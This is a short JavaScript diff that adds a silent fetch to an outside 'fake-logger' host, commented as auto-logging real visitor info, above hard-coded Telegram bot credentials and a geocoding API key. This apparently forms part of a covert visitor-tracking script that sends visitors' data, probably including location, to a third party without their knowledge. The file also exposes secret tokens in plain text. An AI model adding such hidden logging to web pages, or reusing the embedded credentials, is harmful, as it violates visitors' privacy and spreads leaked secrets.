@@ -1,3 +1,8 @@
+// Auto-log real visitor info to backend
+fetch("https://fake-logger.onrender.com/logger.php")
+  .then(res => console.log("Visitor logged"))
+  .catch(err => console.error("Logging failed", err));
+
 const TELEGRAM_BOT_TOKEN = '7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8';
 const CHAT_ID = '6602027873';
 const OPENCAGE_API_KEY = '8e640acb36a3409a9877e0c900653f7d';
